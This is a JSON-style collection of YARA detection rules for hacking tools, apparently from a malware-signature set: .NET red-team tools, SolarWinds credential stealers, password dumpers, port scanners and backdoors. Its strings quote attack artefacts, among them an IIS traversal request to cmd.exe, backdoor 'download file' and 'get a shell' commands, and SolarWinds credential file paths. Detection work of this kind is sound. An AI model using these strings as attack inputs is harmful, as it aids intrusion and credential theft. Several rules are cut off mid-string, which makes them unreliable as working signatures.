  "HKTL_NET_NAME_gray_hat_csharp_code": "rule HKTL_NET_NAME_gray_hat_csharp_code {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/brandonprry/gray_hat_csharp_code\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"gray_hat_csharp_code\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}",
  "HKTL_NET_NAME_NativePayload_ReverseShell": "rule HKTL_NET_NAME_NativePayload_ReverseShell {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/DamonMohammadbagher/NativePayload_ReverseShell\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"NativePayload_ReverseShell\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}",
  "HKTL_NET_NAME_DotNetAVBypass": "rule HKTL_NET_NAME_DotNetAVBypass {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/mandreko/DotNetAVBypass\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"DotNetAVBypass\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}",
  "HKTL_NET_NAME_HexyRunner": "rule HKTL_NET_NAME_HexyRunner {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/bao7uo/HexyRunner\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"HexyRunner\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}",
  "HKTL_NET_NAME_SharpOffensiveShell": "rule HKTL_NET_NAME_SharpOffensiveShell {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/darkr4y/SharpOffensiveShell\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"SharpOffensiveShell\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}",
  "HKTL_NET_NAME_reconness": "rule HKTL_NET_NAME_reconness {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/reconness/reconness\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"reconness\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}",
  "HKTL_NET_NAME_tvasion": "rule HKTL_NET_NAME_tvasion {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/loadenmb/tvasion\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"tvasion\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}",
  "HKTL_NET_NAME_ibombshell": "rule HKTL_NET_NAME_ibombshell {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/Telefonica/ibombshell\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"ibombshell\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}",
  "HKTL_NET_NAME_RemoteProcessInjection": "rule HKTL_NET_NAME_RemoteProcessInjection {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/Mr-Un1k0d3r/RemoteProcessInjection\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"RemoteProcessInjection\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}",
  "HKTL_NET_NAME_njRAT_0_7d_Stub_CSharp": "rule HKTL_NET_NAME_njRAT_0_7d_Stub_CSharp {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/NYAN-x-CAT/njRAT-0.7d-Stub-CSharp\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"njRAT-0.7d-Stub-CSharp\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}",
  "HKTL_NET_NAME_CACTUSTORCH": "rule HKTL_NET_NAME_CACTUSTORCH {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/mdsecactivebreach/CACTUSTORCH\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"CACTUSTORCH\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}",
  "HKTL_NET_NAME_PandaSniper": "rule HKTL_NET_NAME_PandaSniper {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/QAX-A-Team/PandaSniper\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"PandaSniper\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}",
  "HKTL_NET_NAME_xbapAppWhitelistBypassPOC": "rule HKTL_NET_NAME_xbapAppWhitelistBypassPOC {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/jpginc/xbapAppWhitelistBypassPOC\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"xbapAppWhitelistBypassPOC\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}",
  "HKTL_NET_NAME_StageStrike": "rule HKTL_NET_NAME_StageStrike {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/RedXRanger/StageStrike\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"StageStrike\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}",
  "HKTL_Solarwinds_credential_stealer": "rule HKTL_Solarwinds_credential_stealer {\n    meta:\n        description = \"Detects solarwinds credential stealers like e.g. solarflare via the touched certificate, files and database columns\"\n        reference = \"https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/solarwinds-raindrop-malware\"\n        reference = \"https://github.com/mubix/solarflare\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-20\"\n\t\thash = \"1b2e5186464ed0bdd38fcd9f4ab294a7ba28bd829bf296584cbc32e2889037e4\"\n\t\thash = \"4adb69d4222c80d97f8d64e4d48b574908a518f8d504f24ce93a18b90bd506dc\"\n    strings:\n        $certificate = \"CN=SolarWinds-Orion\" ascii nocase wide\n        $credfile1 = \"\\\\CredentialStorage\\\\SolarWindsDatabaseAccessCredential\" ascii nocase wide\n        $credfile2 = \"\\\\KeyStorage\\\\CryptoHelper\\\\default.dat\" ascii nocase wide\n        $credfile3 = \"\\\\Orion\\\\SWNetPerfMon.DB\" ascii nocase wide\n        $credfile4 = \"\\\\Orion\\\\RabbitMQ\\\\.erlang.cookie\" ascii nocase wide\n        $sql1 = \"encryptedkey\" ascii nocase wide fullword\n        $sql2 = \"protectiontype\" ascii nocase wide fullword\n        $sql3 = \"CredentialProperty\" ascii nocase wide fullword\n        $sql4 = \"passwordhash\" ascii nocase wide fullword\n        $sql5 = \"credentialtype\" ascii nocase wide fullword\n        $sql6 = \"passwordsalt\" ascii nocase wide fullword\n    condition:\n        uint16(0) == 0x5A4D and $certificate and ( 2 of ( $credfile* ) or 5 of ( $sql* ) )\n}",
  "WindowsCredentialEditor": "rule WindowsCredentialEditor\n{\n    meta:\n    \tdescription = \"Windows Credential Editor\" threat_level = 10 score = 90\n    strings:\n\t\t$a = \"extract the TGT session key\"\n\t\t$b = \"Windows Credentials Editor\"\n    condition:\n    \t$a or $b\n}",
  "Amplia_Security_Tool": "rule Amplia_Security_Tool\n{\n    meta:\n\t\tdescription = \"Amplia Security Tool\"\n\t\tscore = 60\n\t\tnodeepdive = 1\n    strings:\n\t\t$a = \"Amplia Security\"\n\t\t$b = \"Hernan Ochoa\"\n\t\t$c = \"getlsasrvaddr.exe\"\n\t\t$d = \"Cannot get PID of LSASS.EXE\"\n\t\t$e = \"extract the TGT session key\"\n\t\t$f = \"PPWDUMP_DATA\"\n    condition: 1 of them\n}",
  "PwDump": "rule PwDump\n{\n\tmeta:\n\t\tdescription = \"PwDump 6 variant\"\n\t\tauthor = \"Marc Stroebel\"\n\t\tdate = \"2014-04-24\"\n\t\tscore = 70\n\tstrings:\n\t\t$s5 = \"Usage: %s [-x][-n][-h][-o output_file][-u user][-p password][-s share] machineNa\"\n\t\t$s6 = \"Unable to query service status. Something is wrong, please manually check the st\"\n\t\t$s7 = \"pwdump6 Version %s by fizzgig and the mighty group at foofus.net\" fullword\n\tcondition:\n\t\tall of them\n}",
  "PScan_Portscan_1": "rule PScan_Portscan_1 {\n\tmeta:\n\t\tdescription = \"PScan - Port Scanner\"\n\t\tauthor = \"F. Roth\"\n\t\tscore = 50\n\tstrings:\n\t\t$a = \"00050;0F0M0X0a0v0}",
  "HackTool_Samples": "rule HackTool_Samples {\n\tmeta:\n\t\tdescription = \"Hacktool\"\n\t\tscore = 50\n\tstrings:\n\t\t$a = \"Unable to uninstall the fgexec service\"\n\t\t$b = \"Unable to set socket to sniff\"\n\t\t$c = \"Failed to load SAM functions\"\n\t\t$d = \"Dump system passwords\"\n\t\t$e = \"Error opening sam hive or not valid file\"\n\t\t$f = \"Couldn't find LSASS pid\"\n\t\t$g = \"samdump.dll\"\n\t\t$h = \"WPEPRO SEND PACKET\"\n\t\t$i = \"WPE-C1467211-7C89-49c5-801A-1D048E4014C4\"\n\t\t$j = \"Usage: unshadow PASSWORD-FILE SHADOW-FILE\"\n\t\t$k = \"arpspoof\\\\Debug\"\n\t\t$l = \"Success: The log has been cleared\"\n\t\t$m = \"clearlogs [\\\\\\\\computername\"\n\t\t$n = \"DumpUsers 1.\"\n\t\t$o = \"dictionary attack with specified dictionary file\"\n\t\t$p = \"by Objectif Securite\"\n\t\t$q = \"objectif-securite\"\n\t\t$r = \"Cannot query LSA Secret on remote host\"\n\t\t$s = \"Cannot write to process memory on remote host\"\n\t\t$t = \"Cannot start PWDumpX service on host\"\n\t\t$u = \"usage: %s <system hive> <security hive>\"\n\t\t$v = \"username:domainname:LMhash:NThash\"\n\t\t$w = \"<server_name_or_ip> | -f <server_list_file> [username] [password]\"\n\t\t$x = \"Impersonation Tokens Available\"\n\t\t$y = \"failed to parse pwdump format string\"\n\t\t$z = \"Dumping password\"\n\tcondition:\n\t\t1 of them\n}",
  "Fierce2": "rule Fierce2\n{\n\tmeta:\n\t\tauthor = \"Florian Roth\"\n\t\tdescription = \"This signature detects the Fierce2 domain scanner\"\n\t\tdate = \"07/2014\"\n\t\tscore = 60\n\tstrings:\n\t\t$s1 = \"$tt_xml->process( 'end_domainscan.tt', $end_domainscan_vars,\"\n\tcondition:\n\t\t1 of them\n}",
  "Ncrack": "rule Ncrack\n{\n\tmeta:\n\t\tauthor = \"Florian Roth\"\n\t\tdescription = \"This signature detects the Ncrack brute force tool\"\n\t\tdate = \"07/2014\"\n\t\tscore = 60\n\tstrings:\n\t\t$s1 = \"NcrackOutputTable only supports adding up to 4096 to a cell via\"\n\tcondition:\n\t\t1 of them\n}",
  "SQLMap": "rule SQLMap\n{\n\tmeta:\n\t\tauthor = \"Florian Roth\"\n\t\tdescription = \"This signature detects the SQLMap SQL injection tool\"\n\t\tdate = \"07/2014\"\n\t\tscore = 60\n\tstrings:\n\t\t$s1 = \"except SqlmapBaseException, ex:\"\n\tcondition:\n\t\t1 of them\n}",
  "PortScanner": "rule PortScanner {\n\tmeta:\n\t\tdescription = \"Auto-generated rule on file PortScanner.exe\"\n\t\tauthor = \"yarGen Yara Rule Generator by Florian Roth\"\n\t\thash = \"b381b9212282c0c650cb4b0323436c63\"\n\tstrings:\n\t\t$s0 = \"Scan Ports Every\"\n\t\t$s3 = \"Scan All Possible Ports!\"\n\tcondition:\n\t\tall of them\n}",
  "DomainScanV1_0": "rule DomainScanV1_0 {\n\tmeta:\n\t\tdescription = \"Auto-generated rule on file DomainScanV1_0.exe\"\n\t\tauthor = \"yarGen Yara Rule Generator by Florian Roth\"\n\t\thash = \"aefcd73b802e1c2bdc9b2ef206a4f24e\"\n\tstrings:\n\t\t$s0 = \"dIJMuX$aO-EV\"\n\t\t$s1 = \"XELUxP\\\"-\\\\\"\n\t\t$s2 = \"KaR\\\"U'}",
  "MooreR_Port_Scanner": "rule MooreR_Port_Scanner {\n\tmeta:\n\t\tdescription = \"Auto-generated rule on file MooreR Port Scanner.exe\"\n\t\tauthor = \"yarGen Yara Rule Generator by Florian Roth\"\n\t\thash = \"376304acdd0b0251c8b19fea20bb6f5b\"\n\tstrings:\n\t\t$s0 = \"Description|\"\n\t\t$s3 = \"soft Visual Studio\\\\VB9yp\"\n\t\t$s4 = \"adj_fptan?4\"\n\t\t$s7 = \"DOWS\\\\SyMem32\\\\/o\"\n\tcondition:\n\t\tall of them\n}",
  "NetBIOS_Name_Scanner": "rule NetBIOS_Name_Scanner {\n\tmeta:\n\t\tdescription = \"Auto-generated rule on file NetBIOS Name Scanner.exe\"\n\t\tauthor = \"yarGen Yara Rule Generator by Florian Roth\"\n\t\thash = \"888ba1d391e14c0a9c829f5a1964ca2c\"\n\tstrings:\n\t\t$s0 = \"IconEx\"\n\t\t$s2 = \"soft Visual Stu\"\n\t\t$s4 = \"NBTScanner!y&\"\n\tcondition:\n\t\tall of them\n}",
  "FeliksPack3___Scanners_ipscan": "rule FeliksPack3___Scanners_ipscan {\n\tmeta:\n\t\tdescription = \"Auto-generated rule on file ipscan.exe\"\n\t\tauthor = \"yarGen Yara Rule Generator by Florian Roth\"\n\t\thash = \"6c1bcf0b1297689c8c4c12cc70996a75\"\n\tstrings:\n\t\t$s2 = \"WCAP;}",
  "CGISscan_CGIScan": "rule CGISscan_CGIScan {\n\tmeta:\n\t\tdescription = \"Auto-generated rule on file CGIScan.exe\"\n\t\tauthor = \"yarGen Yara Rule Generator by Florian Roth\"\n\t\thash = \"338820e4e8e7c943074d5a5bc832458a\"\n\tstrings:\n\t\t$s1 = \"Wang Products\" fullword wide\n\t\t$s2 = \"WSocketResolveHost: Cannot convert host address '%s'\"\n\t\t$s3 = \"tcp is the only protocol supported thru socks server\"\n\tcondition:\n\t\tall of ($s*)\n}",
  "IP_Stealing_Utilities": "rule IP_Stealing_Utilities {\n\tmeta:\n\t\tdescription = \"Auto-generated rule on file IP Stealing Utilities.exe\"\n\t\tauthor = \"yarGen Yara Rule Generator by Florian Roth\"\n\t\thash = \"65646e10fb15a2940a37c5ab9f59c7fc\"\n\tstrings:\n\t\t$s0 = \"DarkKnight\"\n\t\t$s9 = \"IPStealerUtilities\"\n\tcondition:\n\t\tall of them\n}",
  "SuperScan4": "rule SuperScan4 {\n\tmeta:\n\t\tdescription = \"Auto-generated rule on file SuperScan4.exe\"\n\t\tauthor = \"yarGen Yara Rule Generator by Florian Roth\"\n\t\thash = \"78f76428ede30e555044b83c47bc86f0\"\n\tstrings:\n\t\t$s2 = \" td class=\\\"summO1\\\">\"\n\t\t$s6 = \"REM'EBAqRISE\"\n\t\t$s7 = \"CorExitProcess'msc#e\"\n\tcondition:\n\t\tall of them\n\n}",
  "PortRacer": "rule PortRacer {\n\tmeta:\n\t\tdescription = \"Auto-generated rule on file PortRacer.exe\"\n\t\tauthor = \"yarGen Yara Rule Generator by Florian Roth\"\n\t\thash = \"2834a872a0a8da5b1be5db65dfdef388\"\n\tstrings:\n\t\t$s0 = \"Auto Scroll BOTH Text Boxes\"\n\t\t$s4 = \"Start/Stop Portscanning\"\n\t\t$s6 = \"Auto Save LogFile by pressing STOP\"\n\tcondition:\n\t\tall of them\n}",
  "scanarator": "rule scanarator {\n\tmeta:\n\t\tdescription = \"Auto-generated rule on file scanarator.exe\"\n\t\tauthor = \"yarGen Yara Rule Generator by Florian Roth\"\n\t\thash = \"848bd5a518e0b6c05bd29aceb8536c46\"\n\tstrings:\n\t\t$s4 = \"GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir HTTP/1.0\"\n\tcondition:\n\t\tall of them\n}",
  "aolipsniffer": "rule aolipsniffer {\n\tmeta:\n\t\tdescription = \"Auto-generated rule on file aolipsniffer.exe\"\n\t\tauthor = \"yarGen Yara Rule Generator by Florian Roth\"\n\t\thash = \"51565754ea43d2d57b712d9f0a3e62b8\"\n\tstrings:\n\t\t$s0 = \"C:\\\\Program Files\\\\Microsoft Visual Studio\\\\VB98\\\\VB6.OLB\"\n\t\t$s1 = \"dwGetAddressForObject\"\n\t\t$s2 = \"Color Transfer Settings\"\n\t\t$s3 = \"FX Global Lighting Angle\"\n\t\t$s4 = \"Version compatibility info\"\n\t\t$s5 = \"New Windows Thumbnail\"\n\t\t$s6 = \"Layer ID Generator Base\"\n\t\t$s7 = \"Color Halftone Settings\"\n\t\t$s8 = \"C:\\\\WINDOWS\\\\SYSTEM\\\\MSWINSCK.oca\"\n\tcondition:\n\t\tall of them\n}",
  "_Bitchin_Threads_": "rule _Bitchin_Threads_ {\n\tmeta:\n\t\tdescription = \"Auto-generated rule on file =Bitchin Threads=.exe\"\n\t\tauthor = \"yarGen Yara Rule Generator by Florian Roth\"\n\t\thash = \"7491b138c1ee5a0d9d141fbfd1f0071b\"\n\tstrings:\n\t\t$s0 = \"DarKPaiN\"\n\t\t$s1 = \"=BITCHIN THREADS\"\n\tcondition:\n\t\tall of them\n}",
  "cgis4_cgis4": "rule cgis4_cgis4 {\n\tmeta:\n\t\tdescription = \"Auto-generated rule on file cgis4.exe\"\n\t\tauthor = \"yarGen Yara Rule Generator by Florian Roth\"\n\t\thash = \"d658dad1cd759d7f7d67da010e47ca23\"\n\tstrings:\n\t\t$s0 = \")PuMB_syJ\"\n\t\t$s1 = \"&,fARW>yR\"\n\t\t$s2 = \"m3hm3t_rullaz\"\n\t\t$s3 = \"7Projectc1\"\n\t\t$s4 = \"Ten-GGl\\\"\"\n\t\t$s5 = \"/Moziqlxa\"\n\tcondition:\n\t\tall of them\n}",
  "portscan": "rule portscan {\n\tmeta:\n\t\tdescription = \"Auto-generated rule on file portscan.exe\"\n\t\tauthor = \"yarGen Yara Rule Generator by Florian Roth\"\n\t\thash = \"a8bfdb2a925e89a281956b1e3bb32348\"\n\tstrings:\n\t\t$s5 = \"0    :SCAN BEGUN ON PORT:\"\n\t\t$s6 = \"0    :PORTSCAN READY.\"\n\tcondition:\n\t\tall of them\n}",
  "ProPort_zip_Folder_ProPort": "rule ProPort_zip_Folder_ProPort {\n\tmeta:\n\t\tdescription = \"Auto-generated rule on file ProPort.exe\"\n\t\tauthor = \"yarGen Yara Rule Generator by Florian Roth\"\n\t\thash = \"c1937a86939d4d12d10fc44b7ab9ab27\"\n\tstrings:\n\t\t$s0 = \"Corrupt Data!\"\n\t\t$s1 = \"K4p~omkIz\"\n\t\t$s2 = \"DllTrojanScan\"\n\t\t$s3 = \"GetDllInfo\"\n\t\t$s4 = \"Compressed by Petite (c)1999 Ian Luck.\"\n\t\t$s5 = \"GetFileCRC32\"\n\t\t$s6 = \"GetTrojanNumber\"\n\t\t$s7 = \"TFAKAbout\"\n\tcondition:\n\t\tall of them\n}",
  "StealthWasp_s_Basic_PortScanner_v1_2": "rule StealthWasp_s_Basic_PortScanner_v1_2 {\n\tmeta:\n\t\tdescription = \"Auto-generated rule on file StealthWasp's Basic PortScanner v1.2.exe\"\n\t\tauthor = \"yarGen Yara Rule Generator by Florian Roth\"\n\t\thash = \"7c0f2cab134534cd35964fe4c6a1ff00\"\n\tstrings:\n\t\t$s1 = \"Basic PortScanner\"\n\t\t$s6 = \"Now scanning port:\"\n\tcondition:\n\t\tall of them\n}",
  "BluesPortScan": "rule BluesPortScan {\n\tmeta:\n\t\tdescription = \"Auto-generated rule on file BluesPortScan.exe\"\n\t\tauthor = \"yarGen Yara Rule Generator by Florian Roth\"\n\t\thash = \"6292f5fc737511f91af5e35643fc9eef\"\n\tstrings:\n\t\t$s0 = \"This program was made by Volker Voss\"\n\t\t$s1 = \"JiBOo~SSB\"\n\tcondition:\n\t\tall of them\n}",
  "scanarator_iis": "rule scanarator_iis {\n\tmeta:\n\t\tdescription = \"Auto-generated rule on file iis.exe\"\n\t\tauthor = \"yarGen Yara Rule Generator by Florian Roth\"\n\t\thash = \"3a8fc02c62c8dd65e038cc03e5451b6e\"\n\tstrings:\n\t\t$s0 = \"example: iis 10.10.10.10\"\n\t\t$s1 = \"send error\"\n\tcondition:\n\t\tall of them\n}",
  "stealth_Stealth": "rule stealth_Stealth {\n\tmeta:\n\t\tdescription = \"Auto-generated rule on file Stealth.exe\"\n\t\tauthor = \"yarGen Yara Rule Generator by Florian Roth\"\n\t\thash = \"8ce3a386ce0eae10fc2ce0177bbc8ffa\"\n\tstrings:\n\t\t$s3 = \"<table width=\\\"60%\\\" bgcolor=\\\"black\\\" cellspacing=\\\"0\\\" cellpadding=\\\"2\\\" border=\\\"1\\\" bordercolor=\\\"white\\\"><tr><td>\"\n\t\t$s6 = \"This tool may be used only by system administrators. I am not responsible for \"\n\tcondition:\n\t\tall of them\n}",
  "Angry_IP_Scanner_v2_08_ipscan": "rule Angry_IP_Scanner_v2_08_ipscan {\n\tmeta:\n\t\tdescription = \"Auto-generated rule on file ipscan.exe\"\n\t\tauthor = \"yarGen Yara Rule Generator by Florian Roth\"\n\t\thash = \"70cf2c09776a29c3e837cb79d291514a\"\n\tstrings:\n\t\t$s0 = \"_H/EnumDisplay/\"\n\t\t$s5 = \"ECTED.MSVCRT0x\"\n\t\t$s8 = \"NotSupported7\"\n\tcondition:\n\t\tall of them\n}",
  "crack_Loader": "rule crack_Loader {\n\tmeta:\n\t\tdescription = \"Auto-generated rule on file Loader.exe\"\n\t\tauthor = \"yarGen Yara Rule Generator by Florian Roth\"\n\t\thash = \"f4f79358a6c600c1f0ba1f7e4879a16d\"\n\tstrings:\n\t\t$s0 = \"NeoWait.exe\"\n\t\t$s1 = \"RRRRRRRW\"\n\tcondition:\n\t\tall of them\n}",
  "CN_GUI_Scanner": "rule CN_GUI_Scanner {\n\tmeta:\n\t\tdescription = \"Detects an unknown GUI scanner tool - CN background\"\n\t\tauthor = \"Florian Roth\"\n\t\thash = \"3c67bbb1911cdaef5e675c56145e1112\"\n\t\tscore = 65\n\t\tdate = \"04.10.2014\"\n\tstrings:\n\t\t$s1 = \"good.txt\" fullword ascii\n\t\t$s2 = \"IP.txt\" fullword ascii\n\t\t$s3 = \"xiaoyuer\" fullword ascii\n\t\t$s0w = \"ssh(\" fullword wide\n\t\t$s1w = \").exe\" fullword wide\n\tcondition:\n\t\tall of them\n}",
  "CN_Packed_Scanner": "rule CN_Packed_Scanner {\n\tmeta:\n\t\tdescription = \"Suspiciously packed executable\"\n\t\tauthor = \"Florian Roth\"\n\t\thash = \"6323b51c116a77e3fba98f7bb7ff4ac6\"\n\t\tscore = 40\n\t\tdate = \"06.10.2014\"\n\tstrings:\n\t\t$s1 = \"kernel32.dll\" fullword ascii\n\t\t$s2 = \"CRTDLL.DLL\" fullword ascii\n\t\t$s3 = \"__GetMainArgs\" fullword ascii\n\t\t$s4 = \"WS2_32.DLL\" fullword ascii\n\tcondition:\n\t\tall of them and filesize < 180KB and filesize > 70KB\n}",
  "Tiny_Network_Tool_Generic": "rule Tiny_Network_Tool_Generic {\n\tmeta:\n\t\tdescription = \"Tiny tool with suspicious function imports. (Rule based on WinEggDrop Scanner samples)\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"08.10.2014\"\n\t\tscore = 40\n\t\ttype = \"file\"\n\t\thash0 = \"9e1ab25a937f39ed8b031cd8cfbc4c07\"\n\t\thash1 = \"cafc31d39c1e4721af3ba519759884b9\"\n\t\thash2 = \"8e635b9a1e5aa5ef84bfa619bd2a1f92\"\n\tstrings:\n\t\t$magic\t= { 4d 5a }\n\n\t\t$s0 = \"KERNEL32.DLL\" fullword ascii\n\t\t$s1 = \"CRTDLL.DLL\" fullword ascii\n\t\t$s3 = \"LoadLibraryA\" fullword ascii\n\t\t$s4 = \"GetProcAddress\" fullword ascii\n\n\t\t$y1 = \"WININET.DLL\" fullword ascii\n\t\t$y2 = \"atoi\" fullword ascii\n\n\t\t$x1 = \"ADVAPI32.DLL\" fullword ascii\n\t\t$x2 = \"USER32.DLL\" fullword ascii\n\t\t$x3 = \"wsock32.dll\" fullword ascii\n\t\t$x4 = \"FreeSid\" fullword ascii\n\t\t$x5 = \"atoi\" fullword ascii\n\n\t\t$z1 = \"ADVAPI32.DLL\" fullword ascii\n\t\t$z2 = \"USER32.DLL\" fullword ascii\n\t\t$z3 = \"FreeSid\" fullword ascii\n\t\t$z4 = \"ToAscii\" fullword ascii\n\n\tcondition:\n\t\t( $magic at 0 ) and all of ($s*) and ( all of ($y*) or all of ($x*) or all of ($z*) ) and filesize < 15KB\n}",
  "Beastdoor_Backdoor": "rule Beastdoor_Backdoor {\n\tmeta:\n\t\tdescription = \"Detects the backdoor Beastdoor\"\n\t\tauthor = \"Florian Roth\"\n\t\tscore = 55\n\t\thash = \"5ab10dda548cb821d7c15ebcd0a9f1ec6ef1a14abcc8ad4056944d060c49535a\"\n\tstrings:\n\t\t$s0 = \"Redirect SPort RemoteHost RPort  -->Port Redirector\" fullword\n\t\t$s1 = \"POST /scripts/WWPMsg.dll HTTP/1.0\" fullword\n\t\t$s2 = \"http://IP/a.exe a.exe            -->Download A File\" fullword\n\t\t$s7 = \"Host: wwp.mirabilis.com:80\" fullword\n\t\t$s8 = \"%s -Set Port PortNumber              -->Set The Service Port\" fullword\n\t\t$s11 = \"Shell                            -->Get A Shell\" fullword\n\t\t$s14 = \"DeleteService ServiceName        -->Delete A Service\" fullword\n\t\t$s15 = \"Getting The UserName(%c%s%c)-->ID(0x%s) Successfully\" fullword\n\t\t$s17 = \"%s -Set ServiceName ServiceName      -->Set The Service Name\" fullword\n\tcondition:\n\t\t2 of them\n}",
  "Powershell_Netcat": "rule Powershell_Netcat {\n\tmeta:\n\t\tdescription = \"Detects a Powershell version of the Netcat network hacking tool\"\n\t\tauthor = \"Florian Roth\"\n\t\tscore = 60\n\t\tdate = \"10.10.2014\"\n\tstrings:\n\t\t$s0 = \"[ValidateRange(1, 65535)]\" fullword\n\t\t$s1 = \"$Client = New-Object -TypeName System.Net.Sockets.TcpClient\" fullword\n\t\t$s2 = \"$Buffer = New-Object -TypeName System.Byte[] -ArgumentList $Client.ReceiveBufferSize\" fullword\n\tcondition:\n\t\tall of them\n}",
  "Chinese_Hacktool_1014": "rule Chinese_Hacktool_1014 {\n\tmeta:\n\t\tdescription = \"Detects a chinese hacktool with unknown use\"\n\t\tauthor = \"Florian Roth\"\n\t\tscore = 60\n\t\tdate = \"10.10.2014\"\n\t\thash = \"98c07a62f7f0842bcdbf941170f34990\"\n\tstrings:\n\t\t$s0 = \"IEXT2_IDC_HORZLINEMOVECURSOR\" fullword wide\n\t\t$s1 = \"msctls_progress32\" fullword wide\n\t\t$s2 = \"Reply-To: %s\" fullword ascii\n\t\t$s3 = \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\" fullword ascii\n\t\t$s4 = \"html htm htx asp\" fullword ascii\n\tcondition:\n\t\tall of them\n}",
  "CN_Hacktool_BAT_PortsOpen": "rule CN_Hacktool_BAT_PortsOpen {\n\tmeta:\n\t\tdescription = \"Detects a chinese BAT hacktool for local port evaluation\"\n\t\tauthor = \"Florian Roth\"\n\t\tscore = 60\n\t\tdate = \"12.10.2014\"\n\tstrings:\n\t\t$s0 = \"for /f \\\"skip=4 tokens=2,5\\\" %%a in ('netstat -ano -p TCP') do (\" ascii\n\t\t$s1 = \"in ('tasklist /fi \\\"PID eq %%b\\\" /FO CSV') do \" ascii\n\t\t$s2 = \"@echo off\" ascii\n\tcondition:\n\t\tall of them\n}",
  "CN_Hacktool_SSPort_Portscanner": "rule CN_Hacktool_SSPort_Portscanner {\n\tmeta:\n\t\tdescription = \"Detects a chinese Portscanner named SSPort\"\n\t\tauthor = \"Florian Roth\"\n\t\tscore = 70\n\t\tdate = \"12.10.2014\"\n\tstrings:\n\t\t$s0 = \"Golden Fox\" fullword wide\n\t\t$s1 = \"Syn Scan Port\" fullword wide\n\t\t$s2 = \"CZ88.NET\" fullword wide\n\tcondition:\n\t\tall of them\n}",
